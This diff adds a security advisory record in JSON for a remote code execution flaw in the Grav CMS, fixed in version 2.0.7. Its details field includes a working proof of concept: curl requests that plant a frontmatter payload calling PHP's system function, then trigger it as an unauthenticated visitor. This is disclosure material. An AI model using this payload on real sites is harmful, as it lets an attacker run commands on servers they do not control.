@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-fj2p-qj2f-74v5",
+  "modified": "2026-09-02T14:51:18Z",
+  "published": "2026-09-02T14:51:18Z",
+  "aliases": [
+    "CVE-2026-64850"
+  ],
+  "summary": "Grav: Remote code execution via unrestricted callable in Blueprint::dynamicData()",
+  "details": "### Summary\nAn account with the `admin.pages` permission (or `api.pages.write`) can run shell\ncommands on the server. The command executes whenever anyone — including an\nunauthenticated visitor — opens the page.\n\n### Details\n`Blueprint::dynamicData()` (system/src/Grav/Common/Data/Blueprint.php:426) passes\na `Class::method` string and its arguments straight to `call_user_func_array()`\nwith no allowlist. The form plugin runs page frontmatter through this path\n(form/classes/Form.php:432), so a page author controls the input.\n`Grav\\Common\\Utils::arrayFilterRecursive($source,$fn)`\n(system/src/Grav/Common/Utils.php:1169) is a public static that calls\n`$fn($key,$value)`, so passing `system` as `$fn` and a command as the array key\nruns the command.\n\n### PoC\nPlaceholders: `<BASE_URL>` the site; `<SESSION_COOKIE>` an admin session cookie\nfor an account with `admin.pages`; `<ADMIN_NONCE>` the `admin-nonce` on any admin\npage (`window.GravAdmin.config.admin_nonce`).\n\nSave a \"form\" page whose field carries the callable directive:\n\n    curl '<BASE_URL>/admin/pages/rcepoc' \\\n      -H 'Cookie: <SESSION_COOKIE>' \\\n      --data-urlencode 'task=save' \\\n      --data-urlencode 'admin-nonce=<ADMIN_NONCE>' \\\n      --data-urlencode 'data[folder]=rcepoc' \\\n      --data-urlencode 'data[name]=form' \\\n      --data-urlencode 'data[title]=x' \\\n      --data-urlencode 'data[content]=hi' \\\n      --data-urlencode \"data[frontmatter]=forms:\n      x:\n        fields:\n          y:\n            type: text\n            data-opts@:\n              - 'Grav\\Common\\Utils::arrayFilterRecursive'\n              - { 'echo GRAV-RCE-OK; id': 'x' }\n              - system\"\n\nTrigger it as an unauthenticated visitor:\n\n    curl '<BASE_URL>/rcepoc'\n\nSuccess check: the GET response body begins with `GRAV-RCE-OK` followed by the\nweb-server user's `id` output (a line starting `uid=...`) — the command ran\nduring the unauthenticated request and its output is reflected in the response.\n\n\n### Impact\nShell command execution as the web-server user, triggered by any visit to the\npage, plantable by any holder of `admin.pages` or `api.pages.write`.\n\nTrust boundary: crossed. `admin.pages` (or `api.pages.write`) grants page\nediting, not code execution; the holder plants the payload and the code runs at\nrequest time on any later view of the page.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.7"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-fj2p-qj2f-74v5"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-64850"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/acffa34cbb0787fee87c609e0d6289e904fee33c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/releases/tag/2.0.7"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-02T14:51:18Z",
+    "nvd_published_at": "2026-08-19T16:18:39Z"
+  }
+}
